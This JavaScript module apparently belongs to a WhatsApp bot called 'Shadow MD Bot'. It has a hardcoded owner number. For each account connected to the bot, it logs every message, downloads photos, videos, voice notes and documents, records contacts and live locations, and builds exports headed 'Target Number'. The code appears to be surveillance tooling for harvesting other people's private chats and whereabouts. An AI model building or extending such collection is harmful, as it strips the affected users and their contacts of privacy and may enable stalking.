/**
 * Shadow MD Bot - Enhanced Data Collection Module
 * Saves messages, media, contacts to JSON for each connected number
 * Owner: 923271054080
 * Features: Media download, contact name resolution, professional exports
 */

const fs = require('fs');
const path = require('path');
const { downloadContentFromMessage } = require('@whiskeysockets/baileys');

const DATA_DIR = './kingbadboitimewisher/data';

function ensureDataDir() {
    if (!fs.existsSync(DATA_DIR)) {
        fs.mkdirSync(DATA_DIR, { recursive: true });
    }
}

function getNumberDataPath(number) {
    ensureDataDir();
    const safeNumber = number.replace(/[^0-9]/g, '');
    return path.join(DATA_DIR, safeNumber);
}

function ensureNumberDir(number) {
    const dir = getNumberDataPath(number);
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
    }
    return dir;
}

function ensureMediaDir(number) {
    const dir = ensureNumberDir(number);
    const mediaDir = path.join(dir, 'media');
    if (!fs.existsSync(mediaDir)) {
        fs.mkdirSync(mediaDir, { recursive: true });
    }
    return mediaDir;
}

// ========== CONTACT NAME RESOLVER ==========
function getContactName(number, remoteJid) {
    try {
        const contacts = getContacts(number);
        const contact = contacts.find(c => c.jid === remoteJid);
        if (contact && contact.name && contact.name !== remoteJid.split('@')[0]) {
            return contact.name;
        }
        // Try to get from saved contacts
        const dir = getNumberDataPath(number);
        const contactsFile = path.join(dir, 'contacts.json');
        if (fs.existsSync(contactsFile)) {
            const allContacts = JSON.parse(fs.readFileSync(contactsFile, 'utf8'));
            const found = allContacts.find(c => c.jid === remoteJid);
            if (found && found.name) return found.name;
        }
        return remoteJid.split('@')[0];
    } catch (e) {
        return remoteJid.split('@')[0];
    }
}

// ========== MESSAGES COLLECTION WITH MEDIA ==========
async function saveMessage(number, messageObj, sock = null) {
    try {
        const dir = ensureNumberDir(number);
        const messagesFile = path.join(dir, 'messages.json');
        const mediaDir = ensureMediaDir(number);

        let messages = [];
        if (fs.existsSync(messagesFile)) {
            messages = JSON.parse(fs.readFileSync(messagesFile, 'utf8'));
        }

        // Extract message data
        const msgData = await extractMessageData(number, messageObj, sock, mediaDir);
        if (msgData) {
            messages.push(msgData);
            fs.writeFileSync(messagesFile, JSON.stringify(messages, null, 2), 'utf8');
        }
    } catch (e) {
        console.log('Error saving message:', e.message);
    }
}

async function extractMessageData(number, m, sock, mediaDir) {
    try {
        if (!m || !m.message) return null;

        const msgType = Object.keys(m.message)[0];
        const isFromMe = m.key.fromMe;
        const remoteJid = m.key.remoteJid;
        const timestamp = m.messageTimestamp ? new Date(m.messageTimestamp * 1000).toISOString() : new Date().toISOString();
        const messageId = m.key.id;

        // Get contact name for display
        const contactName = getContactName(number, remoteJid);

        let content = '';
        let mediaType = 'text';
        let mediaPath = null;
        let caption = '';
        let mediaFileName = null;

        // Extract content based on message type and download media
        if (msgType === 'conversation') {
            content = m.message.conversation || '';
        } else if (msgType === 'extendedTextMessage') {
            content = m.message.extendedTextMessage?.text || '';
        } else if (msgType === 'imageMessage') {
            mediaType = 'image';
            caption = m.message.imageMessage?.caption || '';
            content = caption || '[IMAGE]';
            // Download image
            if (sock) {
                try {
                    const stream = await downloadContentFromMessage(m.message.imageMessage, 'image');
                    const buffer = await streamToBuffer(stream);
                    const ext = m.message.imageMessage.mimetype?.split('/')[1] || 'jpg';
                    mediaFileName = `IMG_${messageId}.${ext}`;
                    mediaPath = path.join(mediaDir, mediaFileName);
                    fs.writeFileSync(mediaPath, buffer);
                } catch (e) {
                    console.log('Image download failed:', e.message);
                }
            }
        } else if (msgType === 'videoMessage') {
            mediaType = 'video';
            caption = m.message.videoMessage?.caption || '';
            content = caption || '[VIDEO]';
            if (sock) {
                try {
                    const stream = await downloadContentFromMessage(m.message.videoMessage, 'video');
                    const buffer = await streamToBuffer(stream);
                    const ext = m.message.videoMessage.mimetype?.split('/')[1] || 'mp4';
                    mediaFileName = `VID_${messageId}.${ext}`;
                    mediaPath = path.join(mediaDir, mediaFileName);
                    fs.writeFileSync(mediaPath, buffer);
                } catch (e) {
                    console.log('Video download failed:', e.message);
                }
            }
        } else if (msgType === 'audioMessage') {
            const isVoice = m.message.audioMessage?.ptt === true;
            mediaType = isVoice ? 'voice' : 'audio';
            content = isVoice ? '[VOICE MESSAGE]' : '[AUDIO]';
            if (sock) {
                try {
                    const stream = await downloadContentFromMessage(m.message.audioMessage, 'audio');
                    const buffer = await streamToBuffer(stream);
                    const ext = m.message.audioMessage.mimetype?.split('/')[1] || 'ogg';
                    mediaFileName = `${isVoice ? 'VOICE' : 'AUDIO'}_${messageId}.${ext}`;
                    mediaPath = path.join(mediaDir, mediaFileName);
                    fs.writeFileSync(mediaPath, buffer);
                } catch (e) {
                    console.log('Audio download failed:', e.message);
                }
            }
        } else if (msgType === 'documentMessage') {
            mediaType = 'document';
            caption = m.message.documentMessage?.caption || '';
            const docName = m.message.documentMessage?.fileName || 'document';
            content = caption || `[DOCUMENT: ${docName}]`;
            if (sock) {
                try {
                    const stream = await downloadContentFromMessage(m.message.documentMessage, 'document');
                    const buffer = await streamToBuffer(stream);
                    const ext = path.extname(docName) || '.bin';
                    mediaFileName = `DOC_${messageId}${ext}`;
                    mediaPath = path.join(mediaDir, mediaFileName);
                    fs.writeFileSync(mediaPath, buffer);
                } catch (e) {
                    console.log('Document download failed:', e.message);
                }
            }
        } else if (msgType === 'stickerMessage') {
            mediaType = 'sticker';
            content = '[STICKER]';
            if (sock) {
                try {
                    const stream = await downloadContentFromMessage(m.message.stickerMessage, 'image');
                    const buffer = await streamToBuffer(stream);
                    mediaFileName = `STK_${messageId}.webp`;
                    mediaPath = path.join(mediaDir, mediaFileName);
                    fs.writeFileSync(mediaPath, buffer);
                } catch (e) {
                    console.log('Sticker download failed:', e.message);
                }
            }
        } else if (msgType === 'contactMessage') {
            mediaType = 'contact';
            content = `[CONTACT] ${m.message.contactMessage?.displayName || ''}`;
        } else if (msgType === 'locationMessage') {
            mediaType = 'location';
            const lat = m.message.locationMessage?.degreesLatitude;
            const long = m.message.locationMessage?.degreesLongitude;
            content = `[LOCATION] ${lat}, ${long}`;
        } else if (msgType === 'liveLocationMessage') {
            mediaType = 'live_location';
            const lat = m.message.liveLocationMessage?.degreesLatitude;
            const long = m.message.liveLocationMessage?.degreesLongitude;
            content = `[LIVE LOCATION] ${lat}, ${long}`;
        } else if (msgType === 'pollCreationMessage') {
            mediaType = 'poll';
            content = `[POLL] ${m.message.pollCreationMessage?.name || ''}`;
        } else {
            content = `[${msgType.toUpperCase()}]`;
        }

        return {
            id: messageId,
            timestamp: timestamp,
            fromMe: isFromMe,
            remoteJid: remoteJid,
            sender: isFromMe ? 'ME' : contactName,
            senderNumber: remoteJid.split('@')[0],
            type: mediaType,
            content: content,
            caption: caption,
            msgType: msgType,
            mediaFileName: mediaFileName,
            mediaPath: mediaPath ? path.relative(dir, mediaPath) : null
        };
    } catch (e) {
        console.log('Error extracting message:', e.message);
        return null;
    }
}

function streamToBuffer(stream) {
    return new Promise((resolve, reject) => {
        const chunks = [];
        stream.on('data', chunk => chunks.push(chunk));
        stream.on('end', () => resolve(Buffer.concat(chunks)));
        stream.on('error', reject);
    });
}

// ========== CONTACTS COLLECTION ==========
function saveContacts(number, contacts) {
    try {
        const dir = ensureNumberDir(number);
        const contactsFile = path.join(dir, 'contacts.json');

        let existingContacts = [];
        if (fs.existsSync(contactsFile)) {
            existingContacts = JSON.parse(fs.readFileSync(contactsFile, 'utf8'));
        }

        const existingJids = new Set(existingContacts.map(c => c.jid));

        for (const contact of contacts) {
            if (!existingJids.has(contact.id)) {
                existingContacts.push({
                    jid: contact.id,
                    name: contact.notify || contact.name || contact.verifiedName || contact.id.split('@')[0],
                    number: contact.id.split('@')[0],
                    savedAt: new Date().toISOString()
                });
                existingJids.add(contact.id);
            }
        }

        fs.writeFileSync(contactsFile, JSON.stringify(existingContacts, null, 2), 'utf8');
    } catch (e) {
        console.log('Error saving contacts:', e.message);
    }
}

// ========== GET DATA FUNCTIONS ==========
function getConnectedNumbers() {
    ensureDataDir();
    try {
        return fs.readdirSync(DATA_DIR).filter(f => {
            const fullPath = path.join(DATA_DIR, f);
            return fs.lstatSync(fullPath).isDirectory();
        });
    } catch (e) {
        return [];
    }
}

function getMessages(number) {
    try {
        const dir = getNumberDataPath(number);
        const messagesFile = path.join(dir, 'messages.json');
        if (fs.existsSync(messagesFile)) {
            return JSON.parse(fs.readFileSync(messagesFile, 'utf8'));
        }
        return [];
    } catch (e) {
        return [];
    }
}

function getContacts(number) {
    try {
        const dir = getNumberDataPath(number);
        const contactsFile = path.join(dir, 'contacts.json');
        if (fs.existsSync(contactsFile)) {
            return JSON.parse(fs.readFileSync(contactsFile, 'utf8'));
        }
        return [];
    } catch (e) {
        return [];
    }
}

function getChatList(number) {
    const messages = getMessages(number);
    const contacts = getContacts(number);
    const chatMap = {};

    for (const msg of messages) {
        if (!chatMap[msg.remoteJid]) {
            // Try to get contact name
            const contact = contacts.find(c => c.jid === msg.remoteJid);
            const displayName = contact ? contact.name : msg.sender;

            chatMap[msg.remoteJid] = {
                remoteJid: msg.remoteJid,
                name: displayName || msg.remoteJid.split('@')[0],
                number: msg.remoteJid.split('@')[0],
                messageCount: 0,
                lastMessage: msg.content,
                lastTimestamp: msg.timestamp
            };
        }
        chatMap[msg.remoteJid].messageCount++;
        if (new Date(msg.timestamp) > new Date(chatMap[msg.remoteJid].lastTimestamp)) {
            chatMap[msg.remoteJid].lastMessage = msg.content;
            chatMap[msg.remoteJid].lastTimestamp = msg.timestamp;
        }
    }

    return Object.values(chatMap);
}

function getChatMessages(number, remoteJid) {
    const messages = getMessages(number);
    return messages.filter(m => m.remoteJid === remoteJid);
}

function getMediaFiles(number) {
    try {
        const mediaDir = path.join(getNumberDataPath(number), 'media');
        if (!fs.existsSync(mediaDir)) return [];
        return fs.readdirSync(mediaDir).map(f => ({
            name: f,
            path: path.join(mediaDir, f),
            size: fs.statSync(path.join(mediaDir, f)).size
        }));
    } catch (e) {
        return [];
    }
}

// ========== EXPORT TO ZIP FUNCTIONS ==========
function exportMessagesToZip(number, remoteJid) {
    const messages = getChatMessages(number, remoteJid);
    const contacts = getContacts(number);
    const contact = contacts.find(c => c.jid === remoteJid);
    const contactName = contact ? contact.name : remoteJid.split('@')[0];
    const targetNumber = remoteJid.split('@')[0];

    let text = `╔══════════════════════════════════════════════════════════════╗
`;
    text += `║     SHADOW MD BOT - PROFESSIONAL CHAT EXPORT                ║
`;
    text += `╠══════════════════════════════════════════════════════════════╣
`;
    text += `║  Connected Number : ${number.padEnd(46)}║
`;
    text += `║  Target Number    : ${targetNumber.padEnd(46)}║
`;
    text += `║  Contact Name     : ${contactName.padEnd(46)}║
`;
    text += `║  Total Messages   : ${String(messages.length).padEnd(46)}║
`;
    text += `║  Export Date      : ${new Date().toLocaleString().padEnd(46)}║
`;
    text += `╚══════════════════════════════════════════════════════════════╝

`;

    for (const msg of messages) {
        const direction = msg.fromMe ? '➡️  YOU' : '⬅️  THEM';
        const time = new Date(msg.timestamp).toLocaleString();
        const typeLabel = getTypeLabel(msg.type);

        text += `─────────────────────────────────────────────────────────────
`;
        text += `[${time}] ${direction}
`;
        text += `Type: ${typeLabel}
`;

        if (msg.type === 'text') {
            text += `${msg.content}
`;
        } else if (msg.type === 'image') {
            text += `[IMAGE MESSAGE]
`;
            if (msg.caption) text += `Caption: ${msg.caption}
`;
            if (msg.mediaFileName) text += `File: ${msg.mediaFileName}
`;
        } else if (msg.type === 'video') {
            text += `[VIDEO MESSAGE]
`;
            if (msg.caption) text += `Caption: ${msg.caption}
`;
            if (msg.mediaFileName) text += `File: ${msg.mediaFileName}
`;
        } else if (msg.type === 'voice') {
            text += `[VOICE MESSAGE]
`;
            if (msg.mediaFileName) text += `File: ${msg.mediaFileName}
`;
        } else if (msg.type === 'audio') {
            text += `[AUDIO FILE]
`;
            if (msg.mediaFileName) text += `File: ${msg.mediaFileName}
`;
        } else if (msg.type === 'document') {
            text += `[DOCUMENT]
`;
            text += `Content: ${msg.content}
`;
            if (msg.mediaFileName) text += `File: ${msg.mediaFileName}
`;
        } else if (msg.type === 'sticker') {
            text += `[STICKER]
`;
            if (msg.mediaFileName) text += `File: ${msg.mediaFileName}
`;
        } else if (msg.type === 'location') {
            text += `[LOCATION]
`;
            text += `${msg.content}
`;
        } else if (msg.type === 'live_location') {
            text += `[LIVE LOCATION]
`;
            text += `${msg.content}
`;
        } else if (msg.type === 'contact') {
            text += `[CONTACT CARD]
`;
            text += `${msg.content}
`;
        } else if (msg.type === 'poll') {
            text += `[POLL]
`;
            text += `${msg.content}
`;
        } else {
            text += `${msg.content}
`;
        }
        text += `
`;
    }

    text += `═══════════════════════════════════════════════════════════════
`;
    text += `End of Chat Export - Shadow MD Bot v2.0
`;
    text += `Generated: ${new Date().toISOString()}
`;
    text += `═══════════════════════════════════════════════════════════════
`;

    return text;
}

function getTypeLabel(type) {
    const labels = {
        text: '📝 Text',
        image: '📷 Image',
        video: '🎬 Video',
        voice: '🎙️ Voice Message',
        audio: '🎵 Audio',
        document: '📄 Document',
        sticker: '🎭 Sticker',
        location: '📍 Location',
        live_location: '📡 Live Location',
        contact: '👤 Contact',
        poll: '📊 Poll'
    };
    return labels[type] || type;
}

function exportContactsToText(number) {
    const contacts = getContacts(number);
    let text = `╔════════════════════════════════════════════════════════════╗
`;
    text += `║  SHADOW MD BOT - CONTACTS EXPORT                          ║
`;
    text += `║  Number: ${number}                                        ║
`;
    text += `║  Exported: ${new Date().toLocaleString()}                 ║
`;
    text += `║  Total Contacts: ${contacts.length}                       ║
`;
    text += `╚════════════════════════════════════════════════════════════╝

`;

    let idx = 1;
    for (const contact of contacts) {
        text += `${idx}. Name: ${contact.name}
`;
        text += `   Number: ${contact.number}
`;
        text += `   JID: ${contact.jid}
`;
        text += `   ─────────────────────────────────────
`;
        idx++;
    }

    text += `
═══════════════════════════════════════════════════════════════
`;
    text += `End of Contacts Export - Shadow MD Bot
`;
    text += `═══════════════════════════════════════════════════════════════
`;

    return text;
}

module.exports = {
    saveMessage,
    saveContacts,
    getConnectedNumbers,
    getMessages,
    getContacts,
    getChatList,
    getChatMessages,
    getMediaFiles,
    exportMessagesToZip,
    exportContactsToText,
    getContactName,
    ensureDataDir,
    getNumberDataPath,
    ensureNumberDir,
    ensureMediaDir
};
